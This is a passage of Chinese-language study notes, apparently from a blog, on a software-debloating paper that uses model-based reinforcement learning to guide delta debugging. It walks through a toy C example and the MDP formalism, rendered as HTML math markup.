class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq></li></ol><h4 id="%E7%AE%97%E6%B3%95%E4%BE%8B%E5%AD%90" tabindex="-1">算法例子</h4><pre><code class="language-C">1 int f1 () &#123; return 0; &#125;2 int f2 () &#123; return 1; &#125;3 int f3 () &#123; return 1; &#125;4 int f4 () &#123; return 1; &#125;5 int f5 () &#123; return 1; &#125;6 int f6 () &#123; return 1; &#125;7 int f7 () &#123; return 1; &#125;8 int main () &#123; return f1(); &#125;</code></pre><ul><li>考虑上述简单的C代码,我们的目标属性时终止并返回0,同时定义在函数粒度上进行简化,因此,最小的程序应该仅包含函数 f1和main.</li><li>下图展示了算法的迭代过程<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(3)_3.png" alt></li></ul><ol><li>最初两次迭代中,算法尝试两个分区(n=2),每个分区包含前四行和最后四行。</li><li>由于这两个分区都无法保留属性，算法通过将n设置为4来增加粒度，并尝试了四个分区，但都失败了（迭代3-6）。</li><li>然后算法尝试了这四个分区的补集。在第8次迭代中，算法找到了一个保留属性的补集。通过将n减1，算法保持当前的粒度并尝试当前候选的n = 3个子集。</li><li>由于所有三个子集（⟨f1, f2⟩，⟨f5, f6⟩，⟨f7, main⟩）都已经尝试过，所以它们被跳过。然后它尝试它们的补集，并在第9次迭代中找到另一个较小的程序。</li><li>再次将n减1，算法保持当前的粒度并尝试当前候选的n = 2个子集。同样，所有两个子集（及其补集）都已经尝试过并且失败了。</li><li>现在算法将粒度翻倍（n &lt;- 2 × 2），并尝试四个子集（迭代10-13），但都失败了。</li><li>继续尝试它们的补集，在第15次迭代中找到了另一个正确的补集。n = 4 - 1 = 3</li><li>现在它尝试程序的n = 3个子集及其补集，并在最后一次迭代中找到最小解决方案。</li></ol><h3 id="3.3-%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0-reinforcement-learning" tabindex="-1">3.3 强化学习 Reinforcement Learning</h3><h4 id="%E9%A9%AC%E5%B0%94%E5%8F%AF%E5%A4%AB%E5%86%B3%E7%AD%96%E8%BF%87%E7%A8%8B-markov-decision-process" tabindex="-1">马尔可夫决策过程 Markov Decision Process</h4><ul><li>Markov Decision Process(MDP) 是一个用于解决顺序决策问题的框架.在这个框架中,一个代理(agent)作为学习者和决策者,与所谓的环境进行交互,代理根据每个状态下的行为从环境中获得奖励. 形式上,MDP有以下几个部分<ul><li>一组状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq>,初始状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mn>0</mn></msub><mo>∈</mo><mi>S</mi></mrow><annotation encoding="application/x-tex">s_0 \in S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq></li><li>一组动作<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">A</mi></mrow><annotation encoding="application/x-tex">\mathcal{A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathcal">A</span></span></span></span></eq>和函数<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>:</mo><mi>S</mi><mo>→</mo><msup><mn>2</mn><mi mathvariant="script">A</mi></msup></mrow><annotation encoding="application/x-tex">A:S\rightarrow 2^{\mathcal{A}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathcal mtight">A</span></span></span></span></span></span></span></span></span></span></span></span></eq>,指定每个状态下可用的函数</li><li>过渡模型<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>:</mo><mi>S</mi><mo>×</mo><mi mathvariant="script">A</mi><mo>→</mo><mi>P</mi><mi>r</mi><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T:S\times \mathcal{A} \rightarrow Pr(S)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathcal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span></span></span></span></eq>,其中<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi mathvariant="normal">∣</mi><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(s&#x27;|s,a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mclose">)</span></span></span></span></eq>表示从状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span></eq>执行动作<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>转移到状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">s&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq>的概率</li><li>奖励函数<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo>:</mo><mi>S</mi><mo>→</mo><mi mathvariant="double-struck">R</mi></mrow><annotation encoding="application/x-tex">R:S\rightarrow \mathbb{R}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6889em;"></span><span class="mord mathbb">R</span></span></span></span></eq>,其中<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">R(s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span></span></span></span></eq>表示状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span></eq>的预期奖励</li></ul></li><li>求解MDP的目标是找到一个策略 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>π</mi><mo>:</mo><mi>S</mi><mo>→</mo><mi mathvariant="script">A</mi></mrow><annotation encoding="application/x-tex">\pi: S \rightarrow \mathcal{A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathcal">A</span></span></span></span></eq> ,该策略指定了在给定状态下的代理采取的理想的行为.通常我们感兴趣的是找到一个最优的策略 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>π</mi><mo lspace="0em" rspace="0em">∗</mo></msup></mrow><annotation encoding="application/x-tex">\pi^{*}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6887em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span></span></span></span></eq> ,使得对于每个状态 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo>∈</mo><mi>S</mi></mrow><annotation encoding="application/x-tex">s\in S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq>,其被定义为 <section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>π</mi><mo>∗</mo></msup><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mo>=</mo><mi><munder><mo><mi>a</mi><mi>r</mi><mi>g</mi><mtext> </mtext><mi>m</mi><mi>a</mi><mi>x</mi></mo><mrow><mi>a</mi><mo>∈</mo><mi>A</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow></munder></mi><mi><munder><mo><mo>∑</mo></mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></munder></mi><mi>T</mi><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi mathvariant="normal">∣</mi><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><msup><mi>V</mi><mo>∗</mo></msup><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\pi^* (s) = \underset{a\in A(s)}{arg \,max} \underset{s&#x27;}{\sum } T(s&#x27;|s,a)V^*(s&#x27;)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7387em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.344em;vertical-align:-1.294em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.4306em;"><span style="top:-2.1146em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight">A</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">s</span><span class="mclose mtight">)</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.1604em;"><span></span></span></span></span></span></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.856em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op" style="position:relative;top:0em;">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.294em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7387em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></eqn></section> 其中 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>V</mi><mo>∗</mo></msup><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">V^*(s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span></span></span></span></eq> 表示在代理在状态s下施行最优策略是奖励的期望和,其是如下递归定义 <section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>V</mi><mo>∗</mo></msup><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mo>=</mo><mi>R</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mo>+</mo><mi>γ</mi><mi><munder><mo><mo>∑</mo></mo><msup><mi>S</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></munder></mi><mi>T</mi><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi mathvariant="normal">∣</mi><mi>s</mi><mo separator="true">,</mo><msup><mi>π</mi><mo>∗</mo></msup><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><msup><mi>V</mi><mo>∗</mo></msup><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex"> V^*(s) = R(s) + \gamma \underset{S&#x27;}{\sum} T(s&#x27;|s,\pi^*(S)) V^*(s&#x27;)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7387em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.3443em;vertical-align:-1.2943em;"></span><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.8557em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op" style="position:relative;top:0em;">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2943em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7387em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">))</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7387em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></eqn></section> 其中 <eq><span class="katex-error" title="ParseError: KaTeX parse error: Can&#x27;t use function &#x27;$1#x27; in math mode at position 8: \gamma $̲ 是一个折扣因子,用于平衡当前…" style="color:#cc0000">\gamma $ 是一个折扣因子,用于平衡当前奖励和未来奖励的重要性. 通常情况下,我们假设 $0 \leq \gamma \leq 1</span></eq> ,并且 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>γ</mi></mrow><annotation encoding="application/x-tex">\gamma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span></span></span></span></eq> 越大,未来奖励的重要性越高</li></ul><h4 id="%E5%9F%BA%E4%BA%8E%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0" tabindex="-1">基于模型的强化学习</h4><ul><li>基于模型的强化学习（Model-based Reinforcement Learning，MBRL）是一种在马尔可夫决策过程（Markov Decision Process，MDP）中使用模型来指导代理与环境交互的技术。</li><li>MBRL通过预测环境对代理在每个状态下采取的动作的响应来学习转移概率和奖励模型。</li><li>在解决MDP的过程中，MBRL跟踪状态转换和动作，根据获取的信息更新模型。</li><li>对于每个状态，代理根据模型估计未来奖励的期望总和，并选择使未来奖励期望总和最大化的动作。</li></ul><h2 id="4-%E6%88%91%E4%BB%AC%E7%9A%84%E6%96%B9%E6%B3%95" tabindex="-1">4 我们的方法</h2><h3 id="4.1-%E9%9D%9E%E6%AD%A3%E5%BC%8F%E6%8F%8F%E8%BF%B0" tabindex="-1">4.1 非正式描述</h3><ul><li><p>我们方法的关键是优先考虑能通过属性测试候选者,以此来快速收敛出一个解决方案,相当于在DD中减少属性测试的失败率,减少遍历失败的候选者的时间</p></li><li><p>为此,我们使用MBRL,维护一个模型来预测每个候选者通过属性测试的几率.</p></li><li><p>与原生DD相比,基于上面的例子,我们的算法只需要调用10次即可,下面详细展示使用标准树决策模型时算法的每次迭代<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(3)_4.png" alt></p><ol><li>第一次迭代中,程序P通过属性测试,将此结果添加到模型数据集中,此时模型预测全部程序都能通过测试</li><li>使用模型考虑优先候选者,此时二者优先级相同,故第一次迭代随机选择子集⟨f5, f6, f7, main⟩,没有通过测试,此结果添加至数据集中,形成图中(b)中第一个<strong>决策树,内部节点表示特定函数的存在条件,叶子节点表示给定程序通过属性测试的概率</strong>.第一棵树预测包含f4的程序通过属性测试,没有则不通过</li><li>第二次迭代选择第一次的补集⟨f1, f2, f3, f4⟩并失败,此结果加入数据集,模型决策树发生变化. 现在分区大小缩小一半,目前模型认为需要同时又f4和main才能通过属性测试</li><li>第三次迭代中,&lt; f1,f2 &gt;的补集被预测通过测试,但没有,将数据加入数据集得到新的预测树,预测同时需要&lt; f2, main&gt; 才能通过测试</li><li>在经过6次迭代后,获得理想决策树,认为包含main和f1是能通过属性测试的,此后再分区大小再缩小,均不能通过属性测试,因此迭代终止,返回程序&lt; main, f1&gt; 为最小程序</li></ol></li></ul><h3 id="4.2-%E7%94%A8%E4%BA%8Edd%E7%9A%84mdp" tabindex="-1">4.2 用于DD的MDP</h3><ul><li><p>接下来对用于DD的MDP作正式定义</p></li><li><p>给定原始程序P和属性测试函数O,MDP的目标是找到一个好的策略来引导DD找到满足O的最小程序</p></li><li><p>MDP的每个组件定义如下</p><ul><li>State:为候选程序列表和粒度等级的二元组<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>=</mo><mo stretchy="false">⟨</mo><mi>L</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">⟩</mo></mrow><annotation encoding="application/x-tex">S = \langle L, n \rangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⟨</span><span class="mord mathnormal">L</span><span 